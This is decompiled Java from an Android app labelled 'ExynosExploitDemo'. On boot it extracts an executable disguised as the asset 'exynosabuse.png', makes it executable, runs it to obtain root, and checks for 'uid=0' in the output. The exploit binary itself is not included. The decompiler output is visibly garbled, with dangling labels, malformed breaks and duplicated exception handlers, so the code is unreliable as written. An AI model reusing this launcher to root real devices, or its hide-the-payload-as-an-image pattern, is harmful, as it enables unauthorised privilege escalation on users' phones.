package aaa.cf.eed;

import android.app.IntentService;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.util.Log;
import eu.chainfire.libsuperuser.Application;
import eu.chainfire.libsuperuser.Shell;
import eu.chainfire.libsuperuser.Shell.SH;
import java.io.File;
import java.util.Iterator;
import java.util.List;

public class BackgroundIntentService extends IntentService
{
  public static final String ACTION_BOOT_COMPLETE = "boot_complete";

  public BackgroundIntentService()
  {
    super("BackgroundIntentService");
  }

  public static void performAction(Context paramContext, String paramString)
  {
    performAction(paramContext, paramString, null);
  }

  public static void performAction(Context paramContext, String paramString, Bundle paramBundle)
  {
    if ((paramContext == null) || (paramString == null) || (paramString.equals("")))
      return;
    Intent localIntent = new Intent(paramContext, BackgroundIntentService.class);
    localIntent.setAction(paramString);
    if (paramBundle != null)
      localIntent.putExtras(paramBundle);
    paramContext.startService(localIntent);
  }

  protected void onBootComplete()
  {
    Log.e("ExynosExploitDemo", "[ExynosExploitDemo] Starting Exploit");
    String str1 = getFilesDir() + File.separator + "exynosabuse.png";
    if (!(new File(str1).exists()))
    {
      str1 = Asset.extractAssetToFile(this, "exynosabuse.png");
      Shell.SH.run("chmod 755 " + str1);
    }
    String str2 = "";
    int i = 0;
    int j = 0;
    label87: String str5;
    if (j >= 10)
    {
      StringBuilder localStringBuilder2 = new StringBuilder("[ExynosExploitDemo] Exploit ");
      if (i == 0)
        break label374;
      str5 = "SUCCESS";
      label114: Log.e("ExynosExploitDemo", str5);
    }
    try
    {
      Thread.sleep(5000L);
      label136: label147: label158: label169: label299: label229: label374: Application.toast(this, str2);
    }
    catch (Exception localException5)
    {
      try
      {
        Thread.sleep(2000L);
        Application.toast(this, str2);
      }
      catch (Exception localException5)
      {
        try
        {
          Thread.sleep(2000L);
          Application.toast(this, str2);
        }
        catch (Exception localException5)
        {
          try
          {
            Thread.sleep(2000L);
            Application.toast(this, str2);
          }
          catch (Exception localException5)
          {
            try
            {
              Thread.sleep(2000L);
              Application.toast(this, str2);
            }
            catch (Exception localException5)
            {
              try
              {
                Thread.sleep(2000L);
                return;
                List localList = Shell.run(str1, new String[] { "id" }, true);
                String str3 = "Exploit result:\n\n";
                int k = 0;
                Iterator localIterator;
                if (localList != null)
                {
                  localIterator = localList.iterator();
                  if (localIterator.hasNext())
                    break label299;
                }
                StringBuilder localStringBuilder1 = new StringBuilder(String.valueOf(str3)).append('\n').append("Status: Exploit ");
                if (i != 0);
                for (String str4 = "SUCCESS"; ; str4 = "FAIL")
                {
                  str2 = str4;
                  if ((i == 0) && (k != 0));
                  ++j;
                  break label87:
                  String str6 = (String)localIterator.next();
                  if (str6.contains("uid=0"))
                    i = 1;
                  if (str6.contains("s_show->seq_printf format string not found"))
                    k = 1;
                  str3 = str3 + str6 + '\n';
                  break label229:
                }
                str5 = "FAIL";
                break label114:
                localException1 = localException1;
                break label136:
                localException2 = localException2;
                break label147:
                localException3 = localException3;
                break label158:
                localException4 = localException4;
                break label169:
                localException5 = localException5;
              }
              catch (Exception localException6)
              {
              }
            }
          }
        }
      }
    }
  }

  protected void onHandleIntent(Intent paramIntent)
  {
    String str = paramIntent.getAction();
    if ((str == null) || (str.equals("")));
    do
      return;
    while (!(str.equals("boot_complete")));
    onBootComplete();
  }
}

/* Location:           C:\Users\changeme\Downloads\dex2jar-0.0.9.13\dex2jar-0.0.9.13\classes_dex2jar\
 * Qualified Name:     aaa.cf.eed.BackgroundIntentService
 * JD-Core Version:    0.5.3
 */